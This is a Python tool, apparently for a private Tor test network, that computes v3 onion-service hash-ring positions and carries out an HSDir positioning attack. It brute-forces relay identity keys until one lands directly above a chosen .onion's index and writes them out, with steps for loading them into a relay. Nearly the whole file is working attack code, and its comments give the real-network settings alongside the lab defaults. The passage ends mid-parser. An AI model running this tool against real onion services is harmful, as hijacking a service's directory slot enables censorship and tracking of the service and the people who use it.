#!/usr/bin/env python3
"""
calcul.py  --  v3 HSDir hash ring (rend-spec-v3): computation + "preshot" attack.

Two subcommands:

  index   For a v3 .onion address, computes the hs_service_index of each replica
          (position of the *service* in the hash ring), plus the blinded key and
          the time period number.

              hs_index(replica) = SHA3_256( "store-at-idx"
                                            | blinded_public_key
                                            | INT_8(replica)
                                            | INT_8(period_length)
                                            | INT_8(period_num) )

  attack  Generates ed25519 relay identity keys until it finds one whose
          hsdir_index falls JUST ABOVE the hs_index of the targeted service.
          That relay then becomes the closest responsible HSDir in the ring:
          it will receive the upload/fetch of THIS service's descriptor.

              hsdir_index(node) = SHA3_256( "node-idx"
                                            | node_ed25519_id
                                            | shared_random_value
                                            | INT_8(period_num)
                                            | INT_8(period_length) )

          /!\\ Mind the ordering: in hs_index it is (period_length, period_num),
          in hsdir_index it is (period_num, period_length). This matches the Tor
          source (hs_common.c: hs_build_hs_index / hs_build_hsdir_index).

          The winning key is written in Tor format (ed25519_master_id_secret_key
          + ed25519_master_id_public_key), ready to be dropped into a lab relay's
          DataDirectory (/var/lib/tor-node/keys/).

The pure-python ed25519 arithmetic is used for decoding/verification. The brute
force uses libsodium (PyNaCl) to generate valid keys very fast.

For educational use in a private Tor lab.

Examples:
    ./calcul.py index <address>.onion
    ./calcul.py index <address>.onion --valid-after 2026-10-03T12:00:00
    ./calcul.py attack <address>.onion --srv <b64_or_hex_32b> --out keys/evil
    ./calcul.py attack <address>.onion --srv <...> --consensus cached-consensus
"""

import argparse
import base64
import binascii
import hashlib
import multiprocessing as mp
import os
import sys
import time
from datetime import datetime, timezone


# ---------------------------------------------------------------------------
# 1. ed25519 arithmetic (reference implementation, slow but correct).
#    Used for decoding the .onion address, for blinding, and for the final
#    verification of the winning key.
# ---------------------------------------------------------------------------
q = 2 ** 255 - 19
L = 2 ** 252 + 27742317777372353535851937790883648493  # group order


def inv(x):
    return pow(x, q - 2, q)


d = (-121665 * inv(121666)) % q
I = pow(2, (q - 1) // 4, q)


def xrecover(y):
    xx = (y * y - 1) * inv(d * y * y + 1)
    x = pow(xx, (q + 3) // 8, q)
    if (x * x - xx) % q != 0:
        x = (x * I) % q
    if x % 2 != 0:
        x = q - x
    return x


By = (4 * inv(5)) % q
Bx = xrecover(By)
BASEPOINT = (Bx % q, By % q)


def edwards_add(P, Q):
    x1, y1 = P
    x2, y2 = Q
    x3 = (x1 * y2 + x2 * y1) * inv(1 + d * x1 * x2 * y1 * y2) % q
    y3 = (y1 * y2 + x1 * x2) * inv(1 - d * x1 * x2 * y1 * y2) % q
    return (x3 % q, y3 % q)


def scalarmult(P, e):
    # iterative double-and-add (avoids deep recursion)
    result = (0, 1)  # identity element
    addend = P
    while e > 0:
        if e & 1:
            result = edwards_add(result, addend)
        addend = edwards_add(addend, addend)
        e >>= 1
    return result


def _bit(h, i):
    return (h[i // 8] >> (i % 8)) & 1


def isoncurve(P):
    x, y = P
    return (-x * x + y * y - 1 - d * x * x * y * y) % q == 0


def decodepoint(s):
    y = sum(2 ** i * _bit(s, i) for i in range(255))
    x = xrecover(y)
    if x & 1 != _bit(s, 255):
        x = q - x
    P = (x, y)
    if not isoncurve(P):
        raise ValueError("invalid ed25519 point (off curve)")
    return P


def encodepoint(P):
    x, y = P
    bits = [(y >> i) & 1 for i in range(255)] + [x & 1]
    return bytes(
        sum(bits[i * 8 + j] << j for j in range(8)) for i in range(32)
    )


# ---------------------------------------------------------------------------
# 2. Decoding the v3 .onion address
# ---------------------------------------------------------------------------
def onion_to_pubkey(onion: str) -> bytes:
    """Extract the ed25519 identity key (32 bytes) from a v3 .onion address."""
    onion = onion.strip().lower()
    if onion.endswith(".onion"):
        onion = onion[:-len(".onion")]

    if len(onion) != 56:
        raise ValueError(
            f"invalid v3 address: {len(onion)} characters (expected 56). "
            "A v3 onion address looks like 56 base32 characters."
        )

    try:
        decoded = base64.b32decode(onion.upper())
    except Exception as exc:
        raise ValueError(f"unreadable base32: {exc}")

    if len(decoded) != 35:
        raise ValueError(f"unexpected decoded length: {len(decoded)} bytes (expected 35)")

    pubkey = decoded[:32]
    checksum = decoded[32:34]
    version = decoded[34]

    if version != 3:
        raise ValueError(f"version {version} not supported (only v3 is)")

    expected = hashlib.sha3_256(
        b".onion checksum" + pubkey + bytes([version])
    ).digest()[:2]
    if checksum != expected:
        raise ValueError("invalid checksum: the address is corrupted or mistyped")

    return pubkey


# ---------------------------------------------------------------------------
# 3. Time period number (TIME-PERIODS)
# ---------------------------------------------------------------------------
def time_period_number(valid_after_unix: int, period_length_min: int,
                       voting_interval_min: int) -> int:
    """
    period_num = (minutes_since_epoch - offset) // period_length
    offset = 12 * voting_interval  (12 voting periods)
    On the real network: voting_interval = 60 min -> offset = 720 min.
    In TestingTorNetwork, use the lab's real V3AuthVotingInterval.
    """
    minutes = valid_after_unix // 60
    offset = 12 * voting_interval_min
    return (minutes - offset) // period_length_min


# Shared-random protocol shape (Tor: SHARED_RANDOM_N_ROUNDS * N_PHASES rounds).
SR_N_ROUNDS = 12
SR_N_PHASES = 2


def fetch_srv_phase(valid_after_unix: int, period_length_min: int,
                    voting_interval_min: int) -> str:
    """Which SRV a CLIENT uses to FETCH a descriptor right now: "current" or
    "previous".

    The active SRV is NOT constant: it alternates between the consensus
    'shared-rand-current-value' and 'shared-rand-previous-value' fields as the
    SRV / time-period cycle advances (an overlap of half a period). This
    replicates Tor exactly:
      - hs_in_period_between_tp_and_srv()  (src/feature/hs/hs_common.c)
      - the fetch selection in node_set_hsdir_index() (src/feature/nodelist/
        nodelist.c): between a new time period and the next SRV -> current SRV;
        between a new SRV and the next time period -> previous SRV.
    """
    vi_sec = voting_interval_min * 60
    total_rounds = SR_N_ROUNDS * SR_N_PHASES          # 24 rounds per SR run
    offset_sec = SR_N_ROUNDS * vi_sec                 # phase_duration = 12*vi (s)

    # sr_state_get_start_time_of_current_protocol_run(): align valid-after down
    # to the start of the 24-round SR run.
    slot = (valid_after_unix // vi_sec) % total_rounds
    srv_start = valid_after_unix - slot * vi_sec

    # hs_get_start_time_of_next_time_period(srv_start).
    minutes = srv_start // 60
    tp_num = (minutes - offset_sec // 60) // period_length_min
    tp_start = ((tp_num + 1) * period_length_min) * 60 + offset_sec

    # hs_in_period_between_tp_and_srv(): 0 if srv_start <= va < tp_start else 1.
    between_tp_and_srv = not (srv_start <= valid_after_unix < tp_start)
    return "current" if between_tp_and_srv else "previous"


# ---------------------------------------------------------------------------
# 4. Key blinding (KEYBLIND)
# ---------------------------------------------------------------------------
ED25519_BASEPOINT_STR = (
    b"(15112221349535400772501151409588531511454012693041857206046113283949847762202, "
    b"46316835694926478169428394003475163141307993866256225615783033603165251855960)"
)


def _clamp(h: bytes) -> int:
    b = bytearray(h)
    b[0] &= 248
    b[31] &= 63
    b[31] |= 64
    return int.from_bytes(b, "little")


def blind_pubkey(identity_pub: bytes, period_num: int, period_length: int) -> bytes:
    blind_string = b"Derive temporary signing key" + bytes([0])
    N = (b"key-blind"
         + period_num.to_bytes(8, "big")
         + period_length.to_bytes(8, "big"))
    h = hashlib.sha3_256(
        blind_string + identity_pub + ED25519_BASEPOINT_STR + N
    ).digest()
    factor = _clamp(h)
    A = decodepoint(identity_pub)
    A_blinded = scalarmult(A, factor)
    return encodepoint(A_blinded)


# ---------------------------------------------------------------------------
# 5. hs_service_index (WHERE-HSDESC) and hsdir_index (HASHRING)
# ---------------------------------------------------------------------------
def hs_service_index(blinded_pub: bytes, replicanum: int,
                     period_length: int, period_num: int) -> bytes:
    return hashlib.sha3_256(
        b"store-at-idx"
        + blinded_pub
        + replicanum.to_bytes(8, "big")
        + period_length.to_bytes(8, "big")
        + period_num.to_bytes(8, "big")
    ).digest()


def hsdir_index_suffix(srv: bytes, period_num: int, period_length: int) -> bytes:
    """Constant part of hsdir_index (everything but the prefix + relay key)."""
    return (srv
            + period_num.to_bytes(8, "big")
            + period_length.to_bytes(8, "big"))


def hsdir_index(node_ed25519_id: bytes, srv: bytes,
                period_num: int, period_length: int) -> bytes:
    return hashlib.sha3_256(
        b"node-idx"
        + node_ed25519_id
        + hsdir_index_suffix(srv, period_num, period_length)
    ).digest()


# ---------------------------------------------------------------------------
# 6. ed25519 keys in Tor format
# ---------------------------------------------------------------------------
# Tor key files are "tagged": 32 bytes of label (string padded with \0)
# followed by the data.
_SECRET_TAG = b"== ed25519v1-secret: type0 =="
_PUBLIC_TAG = b"== ed25519v1-public: type0 =="


def _tagged(tag: bytes, data: bytes) -> bytes:
    if len(tag) > 32:
        raise ValueError("tag too long")
    return tag.ljust(32, b"\x00") + data


def expand_seed(seed: bytes) -> bytes:
    """seed (32b) -> expanded ed25519 secret key (64b) per RFC8032/Tor."""
    h = bytearray(hashlib.sha512(seed).digest())
    h[0] &= 248
    h[31] &= 63
    h[31] |= 64
    return bytes(h)


def verify_keypair(seed: bytes, pub: bytes) -> bool:
    """Check that pub = [clamp(SHA512(seed)[:32])] * B (pure-python ed25519)."""
    expanded = expand_seed(seed)
    a = int.from_bytes(expanded[:32], "little")
    P = scalarmult(BASEPOINT, a)
    return encodepoint(P) == pub


def write_tor_keyfiles(out_dir: str, seed: bytes, pub: bytes) -> tuple:
    """Write ed25519_master_id_{secret,public}_key in Tor format into out_dir.

    Tor automatically regenerates the signing key + certificate from the master
    secret key at startup, so these two files are enough.
    """
    os.makedirs(out_dir, exist_ok=True)
    expanded = expand_seed(seed)
    sec_path = os.path.join(out_dir, "ed25519_master_id_secret_key")
    pub_path = os.path.join(out_dir, "ed25519_master_id_public_key")
    with open(sec_path, "wb") as f:
        f.write(_tagged(_SECRET_TAG, expanded))   # 32 + 64 = 96 bytes
    os.chmod(sec_path, 0o600)
    with open(pub_path, "wb") as f:
        f.write(_tagged(_PUBLIC_TAG, pub))         # 32 + 32 = 64 bytes
    return sec_path, pub_path


# ---------------------------------------------------------------------------
# 7. Brute-force search (multiprocessing + libsodium)
# ---------------------------------------------------------------------------
_MASK256 = (1 << 256) - 1


def _search_worker(worker_id, target_int, suffix, threshold_int,
                   stop_event, result_q, report_every):
    """Generate keys until dist <= threshold or a stop is requested.

    Messages put in result_q: (kind, worker_id, delta_tries, best_dist,
    best_tuple) where best_tuple = (seed32, pub32, idx_bytes) or None.
    kind in {"progress", "win", "final"}.
    """
    try:
        from nacl.bindings import crypto_sign_keypair
    except Exception as exc:  # pragma: no cover
        result_q.put(("error", worker_id, 0, None, repr(exc)))
        return

    sha3 = hashlib.sha3_256
    best_dist = None
    best_tuple = None
    since_report = 0

    while not stop_event.is_set():
        pk, sk = crypto_sign_keypair()          # pk: 32b, sk: seed32 || pk32
        idx = int.from_bytes(sha3(b"node-idx" + pk + suffix).digest(), "big")
        dist = (idx - target_int) & _MASK256
        since_report += 1

        if best_dist is None or dist < best_dist:
            best_dist = dist
            best_tuple = (sk[:32], pk, idx.to_bytes(32, "big"))
            if dist <= threshold_int:
                result_q.put(("win", worker_id, since_report, best_dist, best_tuple))
                stop_event.set()
                return

        if since_report >= report_every:
            result_q.put(("progress", worker_id, since_report, best_dist, best_tuple))
            since_report = 0

    result_q.put(("final", worker_id, since_report, best_dist, best_tuple))


def _fmt_rate(n, secs):
    return f"{n/secs:,.0f}/s" if secs > 0 else "n/a"


def brute_force(target_int, suffix, threshold_int, jobs, max_tries, report_every):
    """Launch `jobs` workers, return (best_dist, best_tuple, total_tries, won)."""
    ctx = mp.get_context("fork")
    stop_event = ctx.Event()
    result_q = ctx.Queue()

    procs = [
        ctx.Process(target=_search_worker,
                    args=(w, target_int, suffix, threshold_int,
                          stop_event, result_q, report_every))
        for w in range(jobs)
    ]
    for p in procs:
        p.start()

    per_worker_best = {}   # worker_id -> (dist, tuple)
    total_tries = 0
    won = False
    t0 = time.time()
    last_print = t0

    def _consider(wid, dist, tup):
        if dist is None:
            return
        cur = per_worker_best.get(wid)
        if cur is None or dist < cur[0]:
            per_worker_best[wid] = (dist, tup)

    try:
        while True:
            try:
                kind, wid, delta, bdist, btup = result_q.get(timeout=0.5)
            except Exception:
                kind = None

            if kind == "error":
                print(f"[!] worker {wid} error: {btup}", file=sys.stderr)
                stop_event.set()
                break

            if kind is not None:
                total_tries += delta
                _consider(wid, bdist, btup)

            if kind == "win":
                won = True
                break

            now = time.time()
            if now - last_print >= 1.0 and per_worker_best:
                gd, _ = min(per_worker_best.values(), key=lambda x: x[0])
                bits = 256 - gd.bit_length() if gd else 256
                print(f"\r  tries={total_tries:,}  "
                      f"({_fmt_rate(total_tries, now - t0)})  "
                      f"best: {bits} leading bits  ",
                      end="", flush=True)
                last_print = now

            if max_tries and total_tries >= max_tries and not won:
                break
    except KeyboardInterrupt:
        print("\n[!] interrupted, keeping the best found.", file=sys.stderr)

    stop_event.set()
    print()  # end the progress line

    # Drain the "final"/remaining messages to get each worker's best.
    deadline = time.time() + 3.0
    while time.time() < deadline:
        try:
            kind, wid, delta, bdist, btup = result_q.get(timeout=0.2)
        except Exception:
            if all(not p.is_alive() for p in procs):
                break
            continue
        total_tries += delta
        _consider(wid, bdist, btup)

    for p in procs:
        p.join(timeout=2.0)
        if p.is_alive():
            p.terminate()

    if not per_worker_best:
        return None, None, total_tries, False
    best_dist, best_tuple = min(per_worker_best.values(), key=lambda x: x[0])
    return best_dist, best_tuple, total_tries, won


# ---------------------------------------------------------------------------
# 8. Competitors: parsing SRV / consensus / id list
# ---------------------------------------------------------------------------
def parse_32bytes(value: str) -> bytes:
    """Decode 32 bytes from hex or base64 (with or without padding)."""
    value = value.strip()
    # hex?
    try:
        if len(value) == 64:
            return binascii.unhexlify(value)
    except (binascii.Error, ValueError):
        pass
    # base64 (add padding if needed)
    s = value.rstrip("=")
    pad = (-len(s)) % 4
    try:
        raw = base64.b64decode(s + "=" * pad)
        if len(raw) == 32:
            return raw
    except (binascii.Error, ValueError):
        pass
    raise ValueError(f"cannot decode 32 bytes from: {value!r}")


def load_relay_ids(consensus_path=None, ids_path=None):
    """Return a list of (label, ed25519_id_bytes) for the competitors.

    - consensus_path: consensus file (microdesc); we grab the lines
      'id ed25519 <base64>' (attached to the nickname of the preceding 'r' line).
    - ids_path: one ed25519 id per line (hex or base64), optional label after
      a space/comma.
    """
    out = []
    if consensus_path:
        current_nick = "?"
        with open(consensus_path, "r", errors="replace") as f:
            for line in f:
                parts = line.split()
                if not parts:
                    continue
                if parts[0] == "r" and len(parts) >= 2:
                    current_nick = parts[1]
                elif parts[0] == "id" and len(parts) >= 3 and parts[1] == "ed25519":
                    try:
                        out.append((current_nick, parse_32bytes(parts[2])))
                    except ValueError:
                        pass
    if ids_path:
        with open(ids_path, "r", errors="replace") as f:
            for i, line in enumerate(f):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                tok = line.replace(",", " ").split()
                try:
                    kid = parse_32bytes(tok[0])
                except ValueError:
                    continue
                label = tok[1] if len(tok) > 1 else f"id#{i}"
                out.append((label, kid))
    return out


def rank_against(target_int, suffix, our_idx_int, competitors):
    """Rank the competitors by distance (above, circular) and tell whether we
    win. Return (nearest_dist, nearest_label, we_win, sorted_list)."""
    rows = []
    for label, kid in competitors:
        idx = int.from_bytes(
            hashlib.sha3_256(b"node-idx" + kid + suffix).digest(), "big")
        dist = (idx - target_int) & _MASK256
        rows.append((dist, label))
    rows.sort(key=lambda x: x[0])
    our_dist = (our_idx_int - target_int) & _MASK256
    if rows:
        nearest_dist, nearest_label = rows[0]
    else:
        nearest_dist, nearest_label = None, None
    we_win = (nearest_dist is None) or (our_dist < nearest_dist)
    return nearest_dist, nearest_label, we_win, rows


def parse_descriptors(path):
    """Parse a server descriptors dump (tor/server/all).

    Return a list of dicts: {nick, ed25519 (bytes|None), fp (rsa hex|None)}.
    """
    relays = []
    cur = None
    with open(path, "r", errors="replace") as f:
        for line in f:
            parts = line.split()
            if not parts:
                continue
            if parts[0] == "router" and len(parts) >= 2:
                if cur is not None:
                    relays.append(cur)
                cur = {"nick": parts[1], "ed25519": None, "fp": None}
            elif cur is None:
                continue
            elif parts[0] == "master-key-ed25519" and len(parts) >= 2:
                try:
                    cur["ed25519"] = parse_32bytes(parts[1])
                except ValueError:
                    pass
            elif parts[0] == "fingerprint":
                cur["fp"] = "".join(parts[1:]).lower()
    if cur is not None:
        relays.append(cur)
    return [r for r in relays if r["ed25519"] is not None]


def parse_consensus(path):
    """Read a consensus: live relays (RSA fp hex), SRV, valid-after.

    Return dict {fps:set(hex), nick2fp:{}, srv_current, srv_previous,
    valid_after}. srv_* are bytes (or None).
    """
    fps = set()
    nick2fp = {}
    srv_cur = srv_prev = None
    valid_after = None
    with open(path, "r", errors="replace") as f:
        for line in f:
            p = line.split()
            if not p:
                continue
            if p[0] == "r" and len(p) >= 3:
                try:
                    fp = base64.b64decode(p[2] + "=" * ((-len(p[2])) % 4)).hex()
                    fps.add(fp)
                    nick2fp[p[1]] = fp
                except (binascii.Error, ValueError):
                    pass
            elif p[0] == "shared-rand-current-value" and len(p) >= 3:
                srv_cur = parse_32bytes(p[2])
            elif p[0] == "shared-rand-previous-value" and len(p) >= 3:
                srv_prev = parse_32bytes(p[2])
            elif p[0] == "valid-after" and len(p) >= 3:
                dt = datetime.strptime(p[1] + " " + p[2], "%Y-%m-%d %H:%M:%S")
                valid_after = int(dt.replace(tzinfo=timezone.utc).timestamp())
    return {"fps": fps, "nick2fp": nick2fp, "srv_current": srv_cur,
            "srv_previous": srv_prev, "valid_after": valid_after}


def filter_live(relays, fps):
    """Keep the descriptors whose RSA fp is in the consensus, dedup by fp
    (avoids the stale descriptors from tor/server/all)."""
    seen = set()
    out = []
    for r in relays:
        if r["fp"] not in fps or r["fp"] in seen:
            continue
        seen.add(r["fp"])
        out.append(r)
    return out


def responsible_hsdirs(target_int, suffix, relays, spread):
    """Reproduce the Tor selection: the `spread` relays whose hsdir_index
    immediately follows the service index in the ring (circular, ascending).

    relays: list of dicts {nick, ed25519, fp}. Return the sorted list of
    (dist, nick, fp, ed25519_hex) limited to `spread`.
    """
    rows = []
    for r in relays:
        idx = int.from_bytes(
            hashlib.sha3_256(b"node-idx" + r["ed25519"] + suffix).digest(), "big")
        dist = (idx - target_int) & _MASK256
        rows.append((dist, r["nick"], r["fp"], r["ed25519"].hex()))
    rows.sort(key=lambda x: x[0])
    return rows[:spread]


# ---------------------------------------------------------------------------
# 9. CLI
# ---------------------------------------------------------------------------
def parse_valid_after(value: str) -> int:
    """Accept a Unix timestamp or an ISO 8601 date (UTC if no tz)."""
    try:
        return int(value)
    except ValueError:
        pass
    dt = datetime.fromisoformat(value)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return int(dt.timestamp())


def _common_period_args(p):
    p.add_argument("--valid-after", type=parse_valid_after, default=None,
                   help="consensus valid-after (Unix or ISO). Default: now.")
    # Defaults calibrated on THIS lab (TestingTorNetwork) via the HSDIR_INDEX oracle:
    #   hsdir-interval = 24 min, voting-interval = 1 min (V3AuthVotingInterval 60s).
    # On the real Tor network it would be 1440 and 60.
    p.add_argument("--period-length", type=int, default=24,
                   help="period length in minutes (hsdir-interval; "
                        "default 24 = this lab, real network = 1440)")
    p.add_argument("--voting-interval", type=int, default=1,
                   help="voting interval in minutes for the offset (default 1 = "
                        "this lab; real network = 60)")


def _compute_period(args):
    valid_after = args.valid_after if args.valid_after is not None else int(time.time())
    period_num = time_period_number(valid_after, args.period_length, args.voting_interval)
    return valid_after, period_num


def cmd_index(args):
    pubkey = onion_to_pubkey(args.onion)
    valid_after, period_num = _compute_period(args)
    va_iso = datetime.fromtimestamp(valid_after, timezone.utc).isoformat()

    print(f"onion address      : {args.onion.strip().lower()}")
    print(f"identity key       : {pubkey.hex()}")
    print(f"valid-after        : {va_iso}  (unix {valid_after})")
    print(f"period_length      : {args.period_length} min")
    print(f"voting_interval    : {args.voting_interval} min  (offset {12*args.voting_interval} min)")
    print(f"period_num         : {period_num}")
    print()

    blinded = blind_pubkey(pubkey, period_num, args.period_length)
    print(f"blinded_public_key : {blinded.hex()}")
    print()

    for replica in range(1, args.replicas + 1):
        idx = hs_service_index(blinded, replica, args.period_length, period_num)
        print(f"hs_service_index (replica {replica}) : {idx.hex()}")


def cmd_attack(args):
    pubkey = onion_to_pubkey(args.onion)

    # Consensus: filters the competitors + provides SRV (previous) + valid-after.
    cons = parse_consensus(args.consensus) if args.consensus else None
    if cons and args.valid_after is None and cons["valid_after"]:
        args.valid_after = cons["valid_after"]

    valid_after, period_num = _compute_period(args)
    va_iso = datetime.fromtimestamp(valid_after, timezone.utc).isoformat()

    if args.srv_zero:
        srv = b"\x00" * 32
        print("[!] SRV = 0 (--srv-zero mode): INVALID result on the real "
              "ring, only to test the mechanics.", file=sys.stderr)
    elif args.srv:
        srv = parse_32bytes(args.srv)
    elif cons and (cons["srv_current"] or cons["srv_previous"]):
        # The active SRV alternates current<->previous along the cycle: pick the
        # one a client actually uses to FETCH at this valid-after (not blindly
        # 'previous'). See fetch_srv_phase().
        phase = fetch_srv_phase(valid_after, args.period_length,
                                args.voting_interval)
        srv = cons["srv_" + phase]
        if srv is None:  # active field empty (e.g. no previous yet after a boot)
            other = "current" if phase == "previous" else "previous"
            srv = cons["srv_" + other]
            print(f"[i] active SRV = {phase} but it is absent from the "
                  f"consensus; falling back to {other}.", file=sys.stderr)
            phase = other
        print(f"[i] SRV = shared-rand-{phase}-value "
              f"(the value a client uses to FETCH at this valid-after).")
    else:
        print("Error: provide --srv or --consensus (with an SRV value).",
              file=sys.stderr)
        sys.exit(1)

    blinded = blind_pubkey(pubkey, period_num, args.period_length)
    target = hs_service_index(blinded, args.target_replica,
                              args.period_length, period_num)
    target_int = int.from_bytes(target, "big")
    suffix = hsdir_index_suffix(srv, period_num, args.period_length)

    print(f"onion address      : {args.onion.strip().lower()}")
    print(f"identity key       : {pubkey.hex()}")
    print(f"valid-after        : {va_iso}  (unix {valid_after})")
    print(f"period_num         : {period_num}   period_length : {args.period_length} min")
    print(f"SRV                : {srv.hex()}")
    print(f"blinded_public_key : {blinded.hex()}")
    print(f"target replica     : {args.target_replica}")
    print(f"hs_service_index   : {target.hex()}")
    print()

    # Competitors (optional) -> objectively defines "a good key".
    competitors = load_relay_ids(None, args.relay_ids)
    if getattr(args, "descriptors", None):
        drelays = parse_descriptors(args.descriptors)
        if cons:
            drelays = filter_live(drelays, cons["fps"])
        competitors += [(r["nick"], r["ed25519"]) for r in drelays]
    threshold_int = (1 << (256 - args.close_bits)) - 1
    if competitors:
        nearest_dist, nearest_label, _, _ = rank_against(
            target_int, suffix, target_int, competitors)
        print(f"competitors loaded : {len(competitors)}")
        if nearest_dist is not None:
            nb = 256 - nearest_dist.bit_length()
            print(f"current HSDir #1   : {nearest_label}  "
                  f"(distance = {nb} leading bits above the index)")
            # Goal: beat the closest with a margin (2x closer).
            threshold_int = min(threshold_int, max(1, nearest_dist // 2))
        print()

    tb = 256 - threshold_int.bit_length()
    print(f"goal               : distance <= {threshold_int} "
          f"(~{tb} leading bits)   jobs={args.jobs}   "
          f"max_tries={args.max_tries or 'unlimited'}")
    print("searching ...")
    print()

    best_dist, best_tuple, total_tries, won = brute_force(
        target_int, suffix, threshold_int,
        args.jobs, args.max_tries, args.report_every)

    if best_tuple is None:
        print("[!] no key generated.", file=sys.stderr)
        sys.exit(1)

    seed, pub, idx_bytes = best_tuple
    idx_int = int.from_bytes(idx_bytes, "big")
    bits = 256 - best_dist.bit_length() if best_dist else 256

    print()
    print("=" * 70)
    print("RESULT")
    print("=" * 70)
    print(f"total tries        : {total_tries:,}")
    print(f"threshold reached  : {'YES' if won else 'NO (best effort)'}")
    print(f"ed25519 key (pub)  : {pub.hex()}")
    print(f"hsdir_index got    : {idx_bytes.hex()}")
    print(f"distance (above)   : {best_dist}  (~{bits} leading bits)")

    # Pure-python check that the key is consistent.
    ok = verify_keypair(seed, pub)
    print(f"keypair check      : {'OK' if ok else 'FAILED (!)'} ")
    if not ok:
        print("[!] the check failed, do not use this key.",
              file=sys.stderr)
        sys.exit(2)

    # Verdict vs competitors.
    if competitors:
        nearest_dist, nearest_label, we_win, rows = rank_against(
            target_int, suffix, idx_int, competitors)
        print()
        if we_win:
            print(f">>> WIN: our relay is the #1 HSDir for this service.")
            if nearest_dist is not None:
                print(f"    we beat '{nearest_label}'.")
        else:
            print(f">>> LOSE: '{nearest_label}' is still closer. "
                  f"Re-run with more tries (higher --close-bits).")
        # Small view of the ring around the service.
        print("    ring (closest competitors above the service):")
        our_dist = (idx_int - target_int) & _MASK256
        shown = [("[OURS]", our_dist)] + [(lbl, dst) for dst, lbl in rows[:5]]
        shown.sort(key=lambda x: x[1])
        for lbl, dst in shown:
            b = 256 - dst.bit_length() if dst else 256
            print(f"      {b:3d} bits   {lbl}")

    # Writing the Tor key files.
    if args.out:
        sec_path, pub_path = write_tor_keyfiles(args.out, seed, pub)
        print()
        print(f"keys written:")
        print(f"  {sec_path}")
        print(f"  {pub_path}")
        print()
        print("To inject into a lab relay:")
        print(f"  - copy these 2 files into  <DataDirectory>/keys/")
        print(f"    (lab relay role: /var/lib/tor-node/keys/)")
        print(f"  - remove any existing ed25519_signing_* and certificate")
        print(f"    so Tor regenerates them from the master key")
        print(f"  - restart the relay; check its ed25519 fingerprint:")
        print(f"      {pub.hex()}")
    else:
        print()
        print(f"ed25519 seed (hex) : {seed.hex()}")
        print("(--out <dir> to write the Tor-format key files)")


def cmd_ring(args):
    """Reproduce the responsible HSDir selection for an onion (prediction/verif)."""
    pubkey = onion_to_pubkey(args.onion)
    relays = parse_descriptors(args.descriptors)
    if not relays:
        print("Error: no relay with master-key-ed25519 in "
              f"{args.descriptors}", file=sys.stderr)
        sys.exit(1)

    # Consensus: filters stale descriptors + provides SRV/valid-after.
    cons = parse_consensus(args.consensus) if args.consensus else None
    if cons:
        relays = filter_live(relays, cons["fps"])
        if args.valid_after is None and cons["valid_after"]:
            args.valid_after = cons["valid_after"]

    valid_after, period_num = _compute_period(args)
    va_iso = datetime.fromtimestamp(valid_after, timezone.utc).isoformat()

    highlight = None
    if args.highlight:
        highlight = parse_32bytes(args.highlight).hex()

    # Which SRV a client actually uses to FETCH at this valid-after.
    phase = fetch_srv_phase(valid_after, args.period_length, args.voting_interval)

    srv_fields = []
    if args.srv:
        srv_fields.append(("provided SRV", parse_32bytes(args.srv)))
    else:
        srv_cur = args.srv_current or (cons and cons["srv_current"])
        srv_prev = args.srv_previous or (cons and cons["srv_previous"])
        def _b(x):
            return x if isinstance(x, bytes) else parse_32bytes(x)
        entries = []
        if srv_prev:
            entries.append(("previous", "SRV previous", _b(srv_prev)))
        if srv_cur:
            entries.append(("current", "SRV current", _b(srv_cur)))
        # Show the ACTIVE SRV (the one used to fetch now) first and flag it.
        entries.sort(key=lambda e: e[0] != phase)
        for which, label, val in entries:
            tag = "  <== ACTIVE (client fetch now)" if which == phase else ""
            srv_fields.append((label + tag, val))
    if not srv_fields:
        print("Error: provide --srv, --srv-current/--srv-previous, or --consensus.",
              file=sys.stderr)
        sys.exit(1)

    print(f"onion              : {args.onion.strip().lower()}")
    print(f"valid-after        : {va_iso}")
    print(f"period_num         : {period_num}   period_length : {args.period_length} min")
    print(f"relays loaded      : {len(relays)}   spread : {args.spread}   "
          f"replicas : {args.replicas}")
    print(f"active SRV (fetch) : {phase}   (the SRV a client uses to FETCH right now)")
    print()

    for srv_label, srv in srv_fields:
        blinded = blind_pubkey(pubkey, period_num, args.period_length)
        print(f"########## {srv_label} = {srv.hex()} ##########")
        for replica in range(1, args.replicas + 1):
            target = hs_service_index(blinded, replica, args.period_length, period_num)
            target_int = int.from_bytes(target, "big")
            suffix = hsdir_index_suffix(srv, period_num, args.period_length)
            resp = responsible_hsdirs(target_int, suffix, relays, args.spread)
            print(f"  replica {replica}  (hs_index {target.hex()[:16]}...) :")
            for dist, nick, fp, ed_hex in resp:
                b = 256 - dist.bit_length() if dist else 256
                star = "  <== TARGET" if highlight and ed_hex == highlight else ""
                fp_disp = fp.upper() if fp else "?"
                print(f"      {b:3d} bits  {nick:<12} fp={fp_disp}{star}")
        print()


def cmd_srv(args):
    """Detect which SRV (current/previous) a client uses to FETCH right now."""
    cons = parse_consensus(args.consensus)
    if args.valid_after is None and cons["valid_after"]:
        args.valid_after = cons["valid_after"]
    valid_after, period_num = _compute_period(args)
    va_iso = datetime.fromtimestamp(valid_after, timezone.utc).isoformat()
    phase = fetch_srv_phase(valid_after, args.period_length, args.voting_interval)

    print(f"valid-after        : {va_iso}  (unix {valid_after})")
    print(f"period_num         : {period_num}   period_length : {args.period_length} min")
    print(f"active SRV (fetch) : {phase}")
    for which in ("current", "previous"):
        v = cons["srv_" + which]
        mark = "   <== used to FETCH now" if which == phase else ""
        print(f"  shared-rand-{which:<8} = {v.hex() if v else '(absent)'}{mark}")


def build_parser():
    p = argparse.ArgumentParser(
        description="v3 HSDir ring: index computation and positioning "
                    "(preshot) attack.")
    sub = p.add_subparsers(dest="cmd", required=True)

    pi = sub.add_parser("index", help="compute the hs_service_index of an onion")
    pi.add_argument("onion", help="v3 .onion address (56 characters)")
    pi.add_argument("--replicas", type=int, default=2, help="hsdir_n_replicas (default 2)")
    _common_period_args(pi)
    pi.set_defaults(func=cmd_index)

    pa = sub.add_parser("attack",
                        help="generate a relay key close in the ring")
    pa.add_argument("onion", help="v3 .onion address (56 characters)")
    pa.add_argument("--srv", help="consensus shared random value (hex or base64, 32b)")
    pa.add_argument("--srv-zero", action="store_true",
                    help="use a null SRV (mechanics test only)")
    pa.add_argument("--target-replica", type=int, default=1,
                    help="target replica (1 or 2; default 1). Cover both = 2 relays.")
    pa.add_argument("--out", help="output directory for the Tor keys")
    pa.add_argument("--close-bits", type=int, default=24,
                    help="number of leading bits to match (default 24). "
                         "Higher = closer but longer (~2^n tries).")
